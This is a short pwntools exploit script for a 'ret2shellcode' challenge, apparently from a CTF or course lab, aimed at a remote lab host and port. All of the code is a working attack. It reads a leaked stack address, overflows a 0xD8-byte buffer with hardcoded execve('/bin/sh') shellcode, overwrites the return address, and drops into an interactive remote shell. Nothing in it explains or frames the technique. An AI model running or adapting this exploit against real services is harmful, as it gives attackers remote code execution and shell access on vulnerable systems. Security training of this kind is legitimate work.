from pwn import *

local = False
elf = 'ret2shellcode' 

if local: 
	context.binary = './'+elf
	r = process("./"+elf)
else: 
	ip = "sqlab.zongyuan.nctu.me"
	port = 6002
	r = remote(ip,port)

#context.arch = "amd64"
#shellcode = asm(shellcraft.sh())
shellcode = '\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05'
# buffer to ret -> 0xD8
print(r.recvuntil(':'))
r.recv(1)
retaddr = r.recv(14)
retaddr = p64(int(retaddr, 0), endian='little')
r.sendline(shellcode + ('\x00'*(0xd8-len(shellcode)))+retaddr)
r.interactive()
